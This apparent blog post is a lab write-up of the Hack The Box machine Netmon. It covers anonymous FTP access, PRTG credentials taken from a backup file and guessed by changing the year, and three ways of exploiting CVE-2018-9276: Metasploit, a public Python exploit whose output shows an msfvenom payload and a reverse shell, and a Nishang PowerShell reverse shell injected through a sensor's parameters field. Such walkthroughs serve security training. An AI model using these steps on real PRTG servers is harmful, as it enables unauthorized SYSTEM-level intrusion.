---
layout: post
title: Netmon (Metasploit + Manual Exploitation)
# hide_title: true
tags: [HTB, Powershell, FTP]
color: blue                 #rgb(165,42,42)
permalink: netmon-htb
author: shivamsaraswat
# feature-img: "assets/img/feature-img/circuit.jpeg"
# thumbnail: "assets/img/thumbnails/feature-img/circuit.jpeg"
excerpt_separator: <!--more-->
---

<center><img src="/assets/img/feature-img/netmon.png" alt="Machine Information"></center>

Netmon is an easy difficulty Windows box with simple enumeration and exploitation. This box is created by [mrb3n](https://app.hackthebox.eu/users/2984). This box takes us to explore FTP to get user flag, and find username and password required to exploit RCE.

<!--more-->

Let's get started!

<h1 id="contents-">Contents <a name="top"></a></h1>
* TOC
{:toc}
<hr>


## Strategy to solve

- As anonymous FTP is enabled and get the `user.txt` flag directly from the Public user folder
- There’s a PRTG configuration backup containing an old password that we can download from FTP
- The PRTG password is the almost the same as the one found in the old backup but it ends with `2019` instead of `2018`
- We can get Meterpreter Session and we can also RCE using Powershell scripts running as sensors in PRTG

<hr>

## Reconnaissance

Run [AutoRecon](https://github.com/Tib3rius/AutoRecon) to enumerate open ports and services running on those ports.

```bash
> autorecon 10.10.10.152
```

Let's see the full TCP port scan results.

```bash
> cat _full_tcp_nmap.txt
....
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.17s latency).
....
PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19 11:18PM 1024 .rnd
| 02-25-19 09:15PM <DIR> inetpub
| 07-16-16 08:18AM <DIR> PerfLogs
| 02-25-19 09:56PM <DIR> Program Files
| 02-02-19 11:28PM <DIR> Program Files (x86)
| 02-03-19 07:08AM <DIR> Users
|_02-25-19 10:49PM <DIR> Windows
| ftp-syst: 
|_ SYST: Windows_NT
80/tcp open http syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-methods: 
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
....
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
....
```

We can observe that there are 13 ports open:

- **Port 21:** running Microsoft ftpd, with Anonymous FTP login allowed
- **Port 80:** running Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
- **Ports 139 & 445:** running SMB
- **Ports 135, 49664, 49665, 49666, 49667, 49668 & 49669:** running Microsoft Windows RPC
- **Ports 5985 & 47001:** running Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

<hr>

## Enumeration

**Getting Free flag from FTP**

In the scan report, we found that the FTP server allows anonymous access. After getting access, I quickly found a `user.txt` flag in the `C:\Users\Public` folder.

```bash
> ftp 10.10.10.152                                    
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:cybersapien): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19 11:18PM 1024 .rnd
02-25-19 09:15PM <DIR> inetpub
07-16-16 08:18AM <DIR> PerfLogs
02-25-19 09:56PM <DIR> Program Files
02-02-19 11:28PM <DIR> Program Files (x86)
02-03-19 07:08AM <DIR> Users
02-25-19 10:49PM <DIR> Windows
226 Transfer complete.
....
ftp> pwd
257 "/Users/Public" is current directory.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
....
> cat user.txt 
dd58......................
```

Finding user flag was very easy!

But we don’t have access to the the Administrator’s directory.

```bash
ftp> pwd
257 "/Users" is current directory.
ftp> cd Administrator
550 Access is denied. 
```

So, now let's try something on port 80!

<hr>

### Getting access to PRTG

The PRTG application is running on port 80:

<center><img src="/assets/img/feature-img/pnm.png" alt="PRTG Network Monitor"></center>

It’s running PRTG Network Monitor, which is a network monitoring software, with software version used is `18.1.37.13946`. Since this is a network monitoring tool, there are chances that it is running with elevated privileges, so if the software contains an RCE, we’ll get a privileged shell.

Since this is an _off-the-shelf_ software, let’s google for default credentials.

<center><img src="/assets/img/feature-img/default-credentials.png" alt="Default Credentials"></center>

I tried the _prtgadmin/prtgadmin_ credentials but that didn’t work.

On further googling, I found that PRTG stores its configuration files in `C:\ProgramData\Paessler`. ( **Source** - [Reddit post](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/))

As per the Reddit post, there might be some files that contain clear-text credentials. So, let’s move on to FTP to check if we have access to any such files.

```bash
ftp> pwd
257 "/ProgramData/Paessler/PRTG Network Monitor" is current directory.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-17-21 02:41PM <DIR> Configuration Auto-Backups
02-17-21 07:00PM <DIR> Log Database
02-02-19 11:18PM <DIR> Logs (Debug)
02-02-19 11:18PM <DIR> Logs (Sensors)
02-02-19 11:18PM <DIR> Logs (System)
02-18-21 12:00AM <DIR> Logs (Web Server)
02-17-21 07:03PM <DIR> Monitoring Database
02-25-19 09:54PM 1189697 PRTG Configuration.dat
02-25-19 09:54PM 1189697 PRTG Configuration.old
07-14-18 02:13AM 1153755 PRTG Configuration.old.bak
02-18-21 07:29AM 1719684 PRTG Graph Data Cache.dat
02-25-19 10:00PM <DIR> Report PDFs
02-02-19 11:18PM <DIR> System Information Database
02-02-19 11:40PM <DIR> Ticket Database
02-02-19 11:18PM <DIR> ToDo Database
226 Transfer complete.
```

Let’s download everything starting with PRTG in the directory to our attack machine.

```bash
ftp> mget PRTG*
```

On checking these files, we find credentials in the _"PRTG Configuration.old.bak"_ file.

```bash
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
```

I tried these credentials on the PRTG login page but it didn’t work. However, as it is a backup file from the year 2018. But according to the dates, the _"PRTG Configuration.old"_ file was last modified or created in 2019 and maybe the admin is lazy and re-used the dbpassword for the admin account and simply used the year 2019.

So let’s try the following password -

> **PrTg@dmin2019**

My guess was right and we're in!

<center><img src="/assets/img/feature-img/admin-welcome.png" alt="Admin Welcome"></center>

Now, let's move on to Exploitation part.

First, we will use Metasploit for exploitation as it is easy, then we will do manual exploitation.

<hr>

## Exploitation

### Exploitation #1: Metasploit

Let's search in Metasploit if there is any module for PRTG.

```bash
msf6 > search prtg

Matching Modules
================

    # Name Disclosure Date Rank Check Description
    - ---- --------------- ---- ----- -----------
    0 exploit/windows/http/prtg_authenticated_rce 2018-06-25 excellent Yes PRTG Network Monitor Authenticated RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/prtg_authenticated_rce
```

We can see that it is vulnerable to RCE. Let's use this exploit and set the required things.

- set ADMIN\_PASSWORD to `PrTg@dmin2019`
- set RHOSTS to `10.10.10.152`
- set LHOST to your machine's `tun0` IP
- run the exploit

Hurray! We got the meterpreter session.

We can get the root flag from Administrator's directory.

```bash
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100666/rw-rw-rw- 282 fil 2019-02-03 17:38:38 +0530 desktop.ini
100666/rw-rw-rw- 33 fil 2019-02-03 10:05:23 +0530 root.txt

meterpreter > cat root.txt
30189........................
```

Now, let's move to manual exploitation.

<hr>

### Exploitation #2: CVE-2018-9276 Python Exploit

For this, I simply searched on google for "**prtg network monitor exploit github**". I got [**this**](https://github.com/wildkindcc/CVE-2018-9276) exploit repository.

Simply run the exploit as its help menu says. _(This exploit may not work on latest version of Kali Linux)_ (I have redacted my lhost)

If this exploit doesn't work then you can use [**this**](https://github.com/mats-codes/CVE-2018-9276/blob/master/CVE-2018-9276_py3.py) updated version.

```bash
> python CVE-2018-9276.py --host 10.10.10.152 --port 80 --lhost 10.10.*.* --lport 4444 --user prtgadmin --password PrTg@dmin2019

[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [10.10.10.152:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2018]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2018] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.*.* LPORT=4444 OUTPUT=/tmp/bhzqmjfi.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.*.*\DKMJUPUZ]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2019] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it is still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.*.*:4444 for the reverse shell!]
listening on [any] 4444 ...
[*] Incoming connection (10.10.10.152,49873)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:IPC$)
connect to [10.10.*.*] from (UNKNOWN) [10.10.10.152] 49881
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
....
C:\Users\Administrator\Desktop>dir
dir
    Volume in drive C has no label.
    Volume Serial Number is 684B-9CE8

    Directory of C:\Users\Administrator\Desktop

02/02/2019 11:35 PM <DIR> .
02/02/2019 11:35 PM <DIR> ..
02/02/2019 11:35 PM 33 root.txt
                1 File(s) 33 bytes
                2 Dir(s) 12,058,755,072 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
30189..........................
```

<hr>

### Exploitation #3: Manual Command Injection / RCE through PRTG sensors

PRTG is a monitoring tool that supports a whole suite of sensors, like ping, http, snmp, etc. The server itself has been added in the device list, so it’s safe to assume we can add sensors to it:

<center><img src="/assets/img/feature-img/prtg_devices.png" alt="PRTG Devices"></center>

I clicked add sensor on the 10.10.10.152 server, then selected `EXE/Script` sensor.

<center><img src="/assets/img/feature-img/prtg_exe.png" alt="PRTG EXE"></center>

We can’t add Powershell custom scripts because we don’t have write access to the application directory, but we can leverage the `Parameters` field to add additional code at the end of an existing Powershell script. I used [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) to get a reverse shell. I added a semi-colon at the beginning of the parameters, then pasted the Nishang code after it.

<center><img src="/assets/img/feature-img/shell.png" alt="Shell"></center>

After the sensor is created, we can start netcat and then we can hit the play button on sensor to execute it.

<center><img src="/assets/img/feature-img/prtg_rce2.png" alt="PRTG RCE"></center>

And finally, we get a shell as `nt authority\system`.


```bash
> nc -lvnp 4444           
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.152] 51985
whoami
nt authority\system
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
30189............................
```

Finally, we got the root flag!

<hr>

## Lessons Learned

- **Insecure configuration** of FTP server that allowed anonymous login. This allowed us to get access to the system and find cleartext credentials. The administrator should have disabled anonymous access to the FTP server.
- **Cleartext credentials**. A backup configuration file of the PRTG network monitoring tool contained cleartext credentials. As we saw in the reddit post, the company had sent its users an email warning them of exposed domain accounts and passwords. The administrator should have complied with the recommendation in the email and deleted the outlined files.
- **Weak authentication credentials**. Although we found old credentials that no longer were in use, we simply changed the year in the credentials and were able to access the admin account. The administrator should have used a complex password that would be difficult to crack and does not resemble previously used passwords on the application. 

<hr>

**I hope you enjoyed this article and gained some valuable knowledge about RCE. [mrb3n](https://app.hackthebox.eu/users/2984) did a great job creating this box.**

**Feel free to [contact me](/contact/) for any suggestions and feedbacks. I would really appreciate those.**

Thank you for reading!

You can also **[Buy Me A Coffee](https://www.buymeacoffee.com/cybersapien)** if you love the content and want to support this blog page!

<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="cybersapien" data-color="#FFDD00" data-emoji=""  data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>

<a href="#top" style="float: right"><strong>Back to Top⮭</strong> </a>